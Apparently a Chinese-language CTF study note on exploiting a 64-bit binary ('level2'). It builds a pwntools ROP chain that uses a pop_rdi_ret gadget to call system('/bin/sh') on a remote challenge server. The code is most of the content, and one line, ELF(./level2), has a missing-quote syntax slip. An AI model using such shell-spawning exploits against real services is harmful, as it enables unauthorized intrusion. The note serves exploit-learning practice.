第一步：我们扫描我们的架构是什么，我们发现我们的架构是一个 64 位的程序，所以我们的 payload 构建就要用一些新的东西。


第二步：因为我们是一个六十四位的程序，我们的函数调用与我们的 32 位不同，我们要先调用一个 `pop_rdi_ret` 的 `gadget`,然后我们把我们的参数 `/bin/sh` 压栈后，再把我们的指令压栈。我**们构造的 payload 和我们的 32 位不同**
```python
from pwn import *
io=remote("11.11.11.11",1111)
io.recv()
payload=cyclic(0x88)

```
第三步：通过我们的 `Ropgadget` 来进行我们的查找，我们就可以获得如下的字段。
![[Pasted image 20231204223153.png]]


```python
pop_rdi_ret=0x4006b3
elf=ELF(./level2)
system_plt=elf.plt["system"]
bin_sh=next(elf.search(b"/bin/sh"))
payload+=p64(pop_rdi_ret)+p64(bin_sh)+p64(system_plt)
io.send(payload)
io.interactive()
```

